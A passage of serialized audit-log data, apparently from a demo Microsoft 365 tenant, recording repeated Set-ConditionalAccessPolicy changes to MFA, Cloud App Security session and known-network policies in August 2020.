'{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/3/2020 2:09:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/3/2020 2:09:04 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/3/2020 5:18:08 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/3/2020 5:18:07 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/4/2020 1:49:57 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/4/2020 1:49:52 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/4/2020 5:28:36 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '8/4/2020 5:28:36 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/5/2020 2:23:25 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/5/2020 2:23:25 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:33 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:32 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:29 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:15 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/6/2020 5:18:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 5:18:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:15 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/5/2020 5:15:32 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 2:16:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': 